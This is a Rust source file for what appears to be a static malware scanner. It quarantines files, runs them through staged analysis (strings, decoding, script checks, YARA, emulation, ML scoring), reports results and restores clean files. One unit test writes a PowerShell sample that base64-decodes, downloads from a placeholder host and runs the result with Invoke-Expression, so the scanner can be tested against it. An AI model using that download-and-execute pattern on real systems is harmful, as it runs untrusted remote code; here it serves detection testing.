use std::collections::VecDeque;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Instant;
use std::time::{SystemTime, UNIX_EPOCH};

use super::config::ScanConfig;
use super::context::ScanContext;
use super::file::{cache, discovery};
use super::heuristics;
use super::report;
use super::report::{NormalizedSeverity, ReportReason, SummaryVerdict};
use super::types::Severity;
use super::yara;
use crate::r#static::types::{Finding, MlAssessment};

#[derive(Debug, Clone, Copy)]
pub struct ScanProgress {
    pub fraction: f32,
    pub stage: &'static str,
}

#[derive(Debug, Clone)]
pub struct ScanOutcome {
    pub severity: Severity,
    pub normalized_severity: NormalizedSeverity,
    pub verdict: SummaryVerdict,
    pub summary: String,
    pub findings: Vec<String>,
    pub finding_details: Vec<Finding>,
    pub reason_entries: Vec<ReportReason>,
    pub original_path: PathBuf,
    pub quarantine_path: PathBuf,
    pub restored_to_original_path: bool,
    pub report_path: PathBuf,
    pub json_report: String,
    pub cache_hit: bool,
    pub rules_version: String,
    pub file_name: String,
    pub extension: String,
    pub sha256: String,
    pub sniffed_mime: String,
    pub detected_format: Option<String>,
    pub file_size_bytes: u64,
    pub risk_score: f64,
    pub safety_score: f64,
    pub signal_sources: Vec<String>,
    pub ml_assessment: Option<MlAssessment>,
}

impl ScanOutcome {
    pub fn is_safe(&self) -> bool {
        matches!(self.severity, Severity::Clean)
    }
}

#[derive(Debug, Clone)]
pub struct BatchScanResult {
    pub path: PathBuf,
    pub outcome: Result<ScanOutcome, String>,
}

pub fn run_pipeline(
    path: &str,
    config: Option<ScanConfig>,
) -> std::io::Result<(ScanContext, Severity)> {
    run_pipeline_with_progress(path, config, |_| {})
}

fn run_pipeline_with_progress<F>(
    path: &str,
    config: Option<ScanConfig>,
    mut progress: F,
) -> std::io::Result<(ScanContext, Severity)>
where
    F: FnMut(ScanProgress),
{
    let mut ctx = ScanContext::from_path(path, config.unwrap_or_default())?;
    if ctx.input_truncated {
        ctx.log_event(
            "pipeline",
            format!(
                "Input capped at {} of {} bytes to stay within memory limits",
                ctx.bytes.len(),
                ctx.original_size_bytes
            ),
        );
    }
    let total_steps = pipeline_step_count(&ctx.config);
    let mut completed_steps = 0usize;
    ctx.log_event(
        "pipeline",
        format!("Starting scan for {}", ctx.input_path.display()),
    );
    ctx.rules_version = yara::compiler::current_rule_version();

    advance_progress(
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Checking fingerprint cache",
    );
    let cache_key = cache::cache_key(&ctx.sha256, &ctx.config, &ctx.rules_version);
    if let Some(cached) = cache::load(&cache_key) {
        let severity = cache::apply(&mut ctx, &cache_key, cached);
        report::run(&ctx, severity);
        return Ok((ctx, severity));
    }
    ctx.cache = Some(super::types::CacheMetadata {
        key: cache_key.clone(),
        hit: false,
        rules_version: ctx.rules_version.clone(),
    });

    if ctx.config.features.enable_file_checks {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Profiling file",
            super::file::run,
        );
    }

    run_stage(
        &mut ctx,
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Building views",
        super::views::run,
    );

    if ctx.config.features.enable_string_extraction {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Extracting strings",
            super::strings::run,
        );
    }

    if ctx.config.features.enable_normalization {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Normalizing text",
            super::normalize::run,
        );
    }

    if ctx.config.features.enable_decode {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Decoding content",
            super::decode::run,
        );
    }

    if ctx.config.features.enable_script_parsing {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Checking scripts",
            super::script::run,
        );
    }

    if ctx.config.features.enable_format_analysis {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Inspecting formats",
            super::format::run,
        );
    }

    if ctx.config.features.enable_yara {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Running signatures",
            super::yara::run,
        );
    }

    if ctx.config.features.enable_emulation {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Running lightweight emulation",
            crate::emulation::run,
        );
    }

    if ctx.config.features.enable_ml_scoring {
        run_stage(
            &mut ctx,
            &mut progress,
            &mut completed_steps,
            total_steps,
            "Scoring ML features",
            crate::ml::run,
        );
    }

    advance_progress(
        &mut progress,
        &mut completed_steps,
        total_steps,
        "Scoring findings",
    );
    let scoring_started = Instant::now();
    let severity = heuristics::run(&mut ctx);
    ctx.record_stage_timing(
        "Scoring findings",
        scoring_started.elapsed().as_millis() as u64,
    );
    ctx.log_event(
        "pipeline",
        format!(
            "Finished scoring with {:?} severity and {} findings",
            severity,
            ctx.findings.len()
        ),
    );
    let _ = cache::store(&cache_key, &ctx, severity);
    progress(ScanProgress {
        fraction: 1.0,
        stage: "Writing report",
    });
    report::run(&ctx, severity);

    Ok((ctx, severity))
}

pub fn init_quarantine() -> Result<(), String> {
    let path = Path::new("quarantine");
    if !path.exists() {
        fs::create_dir(path).map_err(|e| format!("Failed to create quarantine folder: {}", e))?;
    }
    Ok(())
}

pub fn scan_path(file_path: &str, config: Option<ScanConfig>) -> Result<ScanOutcome, String> {
    scan_path_with_progress(file_path, config, |_| {})
}

pub fn scan_path_with_progress<F>(
    file_path: &str,
    config: Option<ScanConfig>,
    mut progress: F,
) -> Result<ScanOutcome, String>
where
    F: FnMut(ScanProgress),
{
    init_quarantine()?;
    progress(ScanProgress {
        fraction: 0.0,
        stage: "Preparing scan",
    });

    let source = Path::new(file_path);
    if !source.is_file() {
        return Err(format!("Not a file: {}", file_path));
    }

    let original_permissions = fs::metadata(source)
        .map(|metadata| metadata.permissions())
        .ok();
    let already_quarantined = is_in_quarantine(source);
    progress(ScanProgress {
        fraction: 0.08,
        stage: if already_quarantined {
            "Using quarantined copy"
        } else {
            "Quarantining file"
        },
    });
    let quarantine_path = if already_quarantined {
        source.to_path_buf()
    } else {
        quarantine_file(source).map_err(|e| format!("Failed to quarantine file: {}", e))?
    };

    let pipeline_path = quarantine_path
        .to_str()
        .ok_or_else(|| "Quarantine path is not valid UTF-8".to_string())?;

    let (mut ctx, severity) = match run_pipeline_with_progress(pipeline_path, config, |update| {
        progress(ScanProgress {
            fraction: 0.12 + update.fraction * 0.78,
            stage: update.stage,
        });
    }) {
        Ok(result) => result,
        Err(error) => {
            if !already_quarantined {
                let _ = release_file(&quarantine_path, source, original_permissions.as_ref());
            }
            return Err(format!("Static analysis failed: {}", error));
        }
    };

    let findings = ctx
        .findings
        .iter()
        .map(report::finding::format_line)
        .collect::<Vec<_>>();
    let mut summary = report::summary::build(&ctx, severity);
    let is_safe = matches!(severity, Severity::Clean);
    let mut restored_to_original_path = false;

    if is_safe && !already_quarantined {
        progress(ScanProgress {
            fraction: 0.94,
            stage: "Restoring clean file",
        });
        match release_file(&quarantine_path, source, original_permissions.as_ref()) {
            Ok(()) => {
                restored_to_original_path = true;
            }
            Err(error) => {
                let restore_error = format!(
                    "Failed to restore file after scan: {}",
                    describe_restore_error(source, &error)
                );
                summary.push_str(" | ");
                summary.push_str(&restore_error);
                ctx.log_event("quarantine", restore_error);
            }
        }
    }

    ctx.log_event(
        "quarantine",
        if restored_to_original_path {
            format!("Restored clean file to {}", source.display())
        } else if already_quarantined {
            format!(
                "Analyzed existing quarantined file {}",
                quarantine_path.display()
            )
        } else {
            format!(
                "Retained file in quarantine at {}",
                quarantine_path.display()
            )
        },
    );

    let (json_report, report_path) = report::persist(
        &ctx,
        severity,
        source,
        &quarantine_path,
        restored_to_original_path,
    )?;

    progress(ScanProgress {
        fraction: 1.0,
        stage: if is_safe {
            "Scan complete"
        } else {
            "File retained in quarantine"
        },
    });

    let signal_sources = scan_signal_sources(&ctx);
    let reason_entries = ctx
        .findings
        .iter()
        .map(structured_reason_from_finding)
        .collect::<Vec<_>>();
    Ok(ScanOutcome {
        severity,
        normalized_severity: report::normalize_severity(severity, ctx.score.risk),
        verdict: report::verdict_from_severity(severity),
        summary,
        findings,
        finding_details: ctx.findings.clone(),
        reason_entries,
        original_path: source.to_path_buf(),
        quarantine_path,
        restored_to_original_path,
        report_path,
        json_report,
        cache_hit: ctx.cache.as_ref().map(|cache| cache.hit).unwrap_or(false),
        rules_version: ctx.rules_version.clone(),
        file_name: ctx.file_name.clone(),
        extension: ctx.extension.clone(),
        sha256: ctx.sha256.clone(),
        sniffed_mime: ctx.sniffed_mime.clone(),
        detected_format: ctx.detected_format.clone(),
        file_size_bytes: target_size_u64(ctx.original_size_bytes),
        risk_score: ctx.score.risk,
        safety_score: ctx.score.safety,
        signal_sources,
        ml_assessment: ctx.ml_assessment.clone(),
    })
}

pub fn scan_file(file_path: &str) -> bool {
    scan_path(file_path, None)
        .map(|outcome| outcome.is_safe())
        .unwrap_or(false)
}

pub fn restore_quarantined_file(quarantine_path: &str, original_path: &str) -> Result<(), String> {
    let quarantine_path = Path::new(quarantine_path);
    let original_path = Path::new(original_path);
    if !quarantine_path.is_file() {
        return Err(format!(
            "Quarantined file not found: {}",
            quarantine_path.display()
        ));
    }

    release_file(quarantine_path, original_path, None).map_err(|e| {
        format!(
            "Failed to restore file: {}",
            describe_restore_error(original_path, &e)
        )
    })
}

pub fn delete_quarantined_file(quarantine_path: &str) -> Result<(), String> {
    let quarantine_path = Path::new(quarantine_path);
    if !quarantine_path.exists() {
        return Err(format!(
            "Quarantined file not found: {}",
            quarantine_path.display()
        ));
    }

    fs::remove_file(quarantine_path).map_err(|e| format!("Failed to delete file: {}", e))
}

pub fn collect_scan_inputs(inputs: &[PathBuf], max_files: usize) -> Vec<PathBuf> {
    discovery::collect_files(inputs, max_files)
        .into_iter()
        .map(|item| item.path)
        .collect()
}

pub fn scan_inputs_parallel(
    inputs: &[PathBuf],
    config: Option<ScanConfig>,
    worker_count: Option<usize>,
    max_files: usize,
) -> Vec<BatchScanResult> {
    let discovered = discovery::collect_files(inputs, max_files);
    let paths = discovered
        .into_iter()
        .map(|item| item.path)
        .collect::<Vec<_>>();
    scan_paths_parallel(paths, config, worker_count)
}

pub fn scan_paths_parallel(
    paths: Vec<PathBuf>,
    config: Option<ScanConfig>,
    worker_count: Option<usize>,
) -> Vec<BatchScanResult> {
    if paths.is_empty() {
        return Vec::new();
    }

    let workers = worker_count
        .filter(|count| *count > 0)
        .unwrap_or_else(default_worker_count)
        .min(paths.len().max(1));
    let queue = Arc::new(Mutex::new(
        paths
            .into_iter()
            .enumerate()
            .collect::<VecDeque<(usize, PathBuf)>>(),
    ));
    let results = Arc::new(Mutex::new(Vec::<(usize, BatchScanResult)>::new()));
    let mut handles = Vec::new();

    for _ in 0..workers {
        let queue = Arc::clone(&queue);
        let results = Arc::clone(&results);
        let config = config.clone();
        handles.push(thread::spawn(move || loop {
            let next = {
                let mut guard = match queue.lock() {
                    Ok(guard) => guard,
                    Err(_) => return,
                };
                guard.pop_front()
            };

            let Some((index, path)) = next else {
                return;
            };

            let outcome = match path.to_str() {
                Some(path_str) => scan_path(path_str, config.clone()),
                None => Err("Path is not valid UTF-8".to_string()),
            };
            if let Ok(mut guard) = results.lock() {
                guard.push((index, BatchScanResult { path, outcome }));
            }
        }));
    }

    for handle in handles {
        let _ = handle.join();
    }

    let mut final_results = results
        .lock()
        .map(|guard| guard.clone())
        .unwrap_or_default();
    final_results.sort_by_key(|(index, _)| *index);
    final_results
        .into_iter()
        .map(|(_, result)| result)
        .collect()
}

fn quarantine_file(source: &Path) -> Result<PathBuf, std::io::Error> {
    let file_name = source.file_name().ok_or_else(|| {
        std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid file path")
    })?;

    let quarantine_path = unique_quarantine_path(file_name);
    move_or_copy(source, &quarantine_path)?;
    tighten_permissions(&quarantine_path)?;

    eprintln!("File quarantined: {}", quarantine_path.display());
    Ok(quarantine_path)
}

fn release_file(
    quarantine_path: &Path,
    original_path: &Path,
    original_permissions: Option<&fs::Permissions>,
) -> Result<(), std::io::Error> {
    if let Some(parent) = original_path.parent() {
        fs::create_dir_all(parent)?;
    }

    move_or_copy(quarantine_path, original_path)?;
    if let Some(permissions) = original_permissions {
        fs::set_permissions(original_path, permissions.clone())?;
    }

    eprintln!("File released from quarantine: {}", original_path.display());
    Ok(())
}

fn describe_restore_error(original_path: &Path, error: &std::io::Error) -> String {
    if error.kind() == std::io::ErrorKind::PermissionDenied {
        let path_text = original_path.display().to_string();
        if path_text.starts_with("/Applications/")
            || path_text.starts_with("/System/")
            || path_text.starts_with("/Library/")
        {
            return format!(
                "{}. macOS is blocking writes into a protected application/system location ({path_text}). \
Grant Full Disk Access and use an elevated move if you really intend to modify that app bundle, or restore the file to a user-writable folder instead.",
                error
            );
        }

        return format!(
            "{}. The destination is not writable for the current process ({path_text}). Check folder ownership, app permissions, or Full Disk Access.",
            error
        );
    }

    error.to_string()
}

fn move_or_copy(source: &Path, destination: &Path) -> Result<(), std::io::Error> {
    if let Some(parent) = destination.parent() {
        fs::create_dir_all(parent)?;
    }

    match fs::rename(source, destination) {
        Ok(()) => Ok(()),
        Err(_) => {
            fs::copy(source, destination)?;
            fs::remove_file(source)?;
            Ok(())
        }
    }
}

fn tighten_permissions(path: &Path) -> Result<(), std::io::Error> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(path)?.permissions();
        perms.set_mode(0o600);
        fs::set_permissions(path, perms)?;
    }

    #[cfg(not(unix))]
    let _ = path;

    Ok(())
}

fn unique_quarantine_path(file_name: &std::ffi::OsStr) -> PathBuf {
    let name = file_name.to_string_lossy();
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_millis())
        .unwrap_or(0);

    Path::new("quarantine").join(format!("{timestamp}_{name}"))
}

fn is_in_quarantine(path: &Path) -> bool {
    path.components()
        .any(|component| component.as_os_str() == "quarantine")
}

fn pipeline_step_count(config: &ScanConfig) -> usize {
    1 + usize::from(config.features.enable_file_checks)
        + 1
        + usize::from(config.features.enable_string_extraction)
        + usize::from(config.features.enable_normalization)
        + usize::from(config.features.enable_decode)
        + usize::from(config.features.enable_script_parsing)
        + usize::from(config.features.enable_format_analysis)
        + usize::from(config.features.enable_yara)
        + usize::from(config.features.enable_emulation)
        + usize::from(config.features.enable_ml_scoring)
        + 1
}

fn run_stage<FProgress, FStage>(
    ctx: &mut ScanContext,
    progress: &mut FProgress,
    completed_steps: &mut usize,
    total_steps: usize,
    stage: &'static str,
    operation: FStage,
) where
    FProgress: FnMut(ScanProgress),
    FStage: FnOnce(&mut ScanContext),
{
    let fraction = *completed_steps as f32 / total_steps as f32;
    progress(ScanProgress { fraction, stage });
    let started = Instant::now();
    operation(ctx);
    let elapsed = started.elapsed().as_millis() as u64;
    ctx.record_stage_timing(stage, elapsed);
    ctx.log_event(stage, format!("Completed in {} ms", elapsed));
    *completed_steps += 1;
}

fn advance_progress<FProgress>(
    progress: &mut FProgress,
    completed_steps: &mut usize,
    total_steps: usize,
    stage: &'static str,
) where
    FProgress: FnMut(ScanProgress),
{
    let fraction = *completed_steps as f32 / total_steps as f32;
    progress(ScanProgress { fraction, stage });
    *completed_steps += 1;
}

fn default_worker_count() -> usize {
    thread::available_parallelism()
        .map(|parallelism| parallelism.get())
        .unwrap_or(2)
}

#[allow(clippy::items_after_test_module)]
#[cfg(test)]
mod tests {
    use std::time::{SystemTime, UNIX_EPOCH};

    use crate::r#static::config::ScanConfig;

    use super::scan_path;

    fn unique_temp_path(prefix: &str) -> std::path::PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|duration| duration.as_nanos())
            .unwrap_or(0);
        std::env::temp_dir().join(format!("{prefix}_{nanos}.txt"))
    }

    #[test]
    fn clean_files_are_restored_after_scan() {
        let path = unique_temp_path("projectx_clean_scan");
        std::fs::write(&path, "hello world").unwrap();

        let outcome = scan_path(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap();

        assert!(outcome.is_safe());
        assert!(path.exists());

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn suspicious_files_remain_quarantined() {
        let path = std::env::temp_dir().join(format!(
            "projectx_suspicious_scan_{}.ps1",
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|duration| duration.as_nanos())
                .unwrap_or(0)
        ));
        std::fs::write(
            &path,
            r#"
            powershell -EncodedCommand AAAA
            [Convert]::FromBase64String("QUJDRA==")
            (New-Object Net.WebClient).DownloadString("https://example.invalid")
            Invoke-Expression $decoded
            "#,
        )
        .unwrap();

        let outcome = scan_path(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap();

        assert!(!outcome.is_safe());
        assert!(!path.exists());
        assert!(outcome.quarantine_path.exists());

        let _ = std::fs::remove_file(outcome.quarantine_path);
    }
}

fn scan_signal_sources(ctx: &ScanContext) -> Vec<String> {
    let mut sources = Vec::new();
    if ctx.cache.as_ref().map(|cache| cache.hit).unwrap_or(false) {
        sources.push("cache".to_string());
    }
    for finding in &ctx.findings {
        let source = report::normalize_reason_source(&finding.code).to_string();
        if !sources.contains(&source) {
            sources.push(source);
        }
    }
    sources
}

fn structured_reason_from_finding(finding: &Finding) -> ReportReason {
    let source = report::normalize_reason_source(&finding.code);
    ReportReason {
        reason_type: source.to_string(),
        source: source.to_string(),
        name: report::normalize_reason_name(&finding.code),
        description: report::normalize_reason_description(&finding.message),
        weight: finding.weight,
    }
}

fn target_size_u64(size: usize) -> u64 {
    size.min(u64::MAX as usize) as u64
}
